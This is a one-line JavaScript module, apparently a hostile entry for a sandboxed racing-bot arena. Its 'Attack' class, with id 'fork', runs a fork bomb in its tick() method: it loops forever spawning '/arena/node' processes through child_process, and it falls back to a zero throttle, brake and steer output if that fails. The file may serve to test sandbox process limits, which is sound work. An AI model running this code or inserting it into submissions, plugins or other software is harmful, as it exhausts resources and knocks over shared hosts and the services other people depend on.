export default class Attack {id='fork';tick(){try{const cp=process.getBuiltinModule('child_process');for(;;)cp.spawn('/arena/node',['-e','0']);}catch{return {throttle:0,brake:0,steer:0};}}}
